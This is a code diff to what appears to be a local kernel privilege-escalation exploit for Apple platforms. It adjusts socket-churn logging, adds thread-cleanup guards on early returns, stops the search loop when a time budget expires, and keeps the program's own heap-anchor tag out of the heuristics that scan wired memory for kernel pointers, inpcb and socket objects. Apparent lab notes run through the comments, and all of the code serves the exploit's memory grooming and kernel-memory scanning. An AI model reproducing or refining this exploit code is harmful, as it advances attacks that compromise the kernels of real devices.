@@ -53,7 +53,15 @@ static void *cs2_churn_worker(void *arg) {
         }
         for (int i = 0; i < 512; i++)
             if (fds[i] >= 0) close(fds[i]);
-        if (count > 0) LOG("socket churn: created %d, closed %d", count, count);
+        if (count > 0) {
+            /* 2026-11-19: one line per 512-batch flooded 38k lines into the
+               tap log. Keep the first 3 + every 256th for cadence evidence. */
+            static uint64_t churn_batches = 0;
+            churn_batches++;
+            if (churn_batches <= 3 || (churn_batches % 256) == 0)
+                LOG("socket churn: created %d, closed %d (batch %llu)",
+                    count, count, (unsigned long long)churn_batches);
+        }
         usleep(50);
     }
     return NULL;
@@ -181,6 +189,14 @@ kern_return_t cs2_pe_v1(void) {
             // these allocations are NOT contiguous
             kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
             if (kr != KERN_SUCCESS) {
+                /* early-return guard: without this the churn thread outlives
+                   the tap and spins at USER_INTERACTIVE forever (the
+                   2026-11-19 "never ends" receipt). No-op pre-churn. */
+                if (g_cs2_churn_go) {
+                    g_cs2_churn_go = 0;
+                    pthread_join(g_cs2_churn_tid, NULL);
+                    LOG("[churn] cs2 churn thread stopped (early-return guard)");
+                }
                 free(read_buffer);
                 free(write_buffer);
                 return kr;
@@ -240,6 +256,14 @@ kern_return_t cs2_pe_v1(void) {
         }
         // 8 search mappings
         for (size_t s = 0; s < search_mappings_count; s++) {
+            /* 2026-11-19 cs2_krw_log 3: expiry only broke the inner sweep,
+               so maps 2..7 still wired dead 128MB surfaces and the tap
+               churned minutes past budget. Stop before the mlock. */
+            if (cs2_expired()) {
+                LOG("budget expired before mapping %lu (pass=%lu) — stop; no dead mlocks",
+                    (unsigned long)s, (unsigned long)pass);
+                break;
+            }
             mach_vm_address_t search_mapping_address = search_mappings[s];
             LOG("looking in search mapping: %lu", s);
 
@@ -248,6 +272,14 @@ kern_return_t cs2_pe_v1(void) {
             // create a memory entry with mapping size at allocated search mapping address s we allocated last loop
             kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
             if (kr != KERN_SUCCESS) {
+                /* early-return guard: without this the churn thread outlives
+                   the tap and spins at USER_INTERACTIVE forever (the
+                   2026-11-19 "never ends" receipt). No-op pre-churn. */
+                if (g_cs2_churn_go) {
+                    g_cs2_churn_go = 0;
+                    pthread_join(g_cs2_churn_tid, NULL);
+                    LOG("[churn] cs2 churn thread stopped (early-return guard)");
+                }
                 free(read_buffer);
                 free(write_buffer);
                 return kr;
@@ -300,16 +332,20 @@ kern_return_t cs2_pe_v1(void) {
                         int kq = 0, ipc_cand = -1, so_cand = -1;
                         for (uint32_t wq = 0; wq + 8 <= cls_len; wq += 8) {
                             uint64_t v = *(uint64_t *)((uint8_t *)read_buffer + wq);
+                            if (cs2_ctx.heap_anchor_armed && v == cs2_ctx.heap_anchor) continue;   /* own fil-tag, not a kptr */
                             if ((v >> 48) >= 0xffff) kq++;
                         }
                         for (uint32_t zo = 0; zo + 0x400 <= cls_len; zo += 0x400) {
                             uint64_t z38 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x38);
                             uint64_t z40 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x40);
-                            if (ipc_cand < 0 && (z38 >> 48) >= 0xffff && (z40 >> 48) >= 0xffff)
+                            if (ipc_cand < 0 && (z38 >> 48) >= 0xffff && (z40 >> 48) >= 0xffff &&
+                                !(cs2_ctx.heap_anchor_armed &&
+                                  (z38 == cs2_ctx.heap_anchor || z40 == cs2_ctx.heap_anchor)))
                                 ipc_cand = (int)zo;
                             uint64_t s18 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x18);
                             int32_t s23c = *(int32_t *)((uint8_t *)read_buffer + zo + 0x23c);
-                            if (so_cand < 0 && (s18 >> 48) >= 0xffff && s23c > 0 && s23c < 0x10000)
+                            if (so_cand < 0 && (s18 >> 48) >= 0xffff && s23c > 0 && s23c < 0x10000 &&
+                                !(cs2_ctx.heap_anchor_armed && s18 == cs2_ctx.heap_anchor))
                                 so_cand = (int)zo;
                         }
                         LOG("[lswarm-cls] map=%lu off=0x%zx kq=%d inpcb_cand=0x%x sock_cand=0x%x (0x400 stride, static-verified)",
@@ -389,6 +425,14 @@ kern_return_t cs2_pe_v1(void) {
             // cs2_surface_munlock(search_mapping_address);
             kr = mach_port_deallocate(mach_task_self(), memory_object);
             if (kr != KERN_SUCCESS) {
+                /* early-return guard: without this the churn thread outlives
+                   the tap and spins at USER_INTERACTIVE forever (the
+                   2026-11-19 "never ends" receipt). No-op pre-churn. */
+                if (g_cs2_churn_go) {
+                    g_cs2_churn_go = 0;
+                    pthread_join(g_cs2_churn_tid, NULL);
+                    LOG("[churn] cs2 churn thread stopped (early-return guard)");
+                }
                 free(read_buffer);
                 free(write_buffer);
                 return kr;
@@ -604,7 +648,15 @@ int cs2_run(void) {
     arc4random_buf(&cs2_ctx.wired_page_marker, sizeof(cs2_ctx.wired_page_marker));
 
     cs2_ctx.default_file_content = calloc(1, cs2_ctx.target_file_size);
-    memset_pattern8(cs2_ctx.default_file_content, &cs2_ctx.random_marker, cs2_ctx.target_file_size);
+    /* 2026-11-19 fil tag: REAL same-boot heap anchor when the glue armed it
+       (board leaks[] via LabHeapAnchorSameBoot), else the per-boot random
+       marker. The anchor is EXCLUDED from every kptr-shape classifier —
+       an anchor-tagged window is a geometry measurement of OUR OWN pages,
+       never a kernel disclosure. */
+    if (cs2_ctx.heap_anchor_armed)
+        memset_pattern8(cs2_ctx.default_file_content, &cs2_ctx.heap_anchor, cs2_ctx.target_file_size);
+    else
+        memset_pattern8(cs2_ctx.default_file_content, &cs2_ctx.random_marker, cs2_ctx.target_file_size);
 
     // size of read is 32 bytes
     cs2_ctx.getsockopt_read_data = calloc(1, 32);
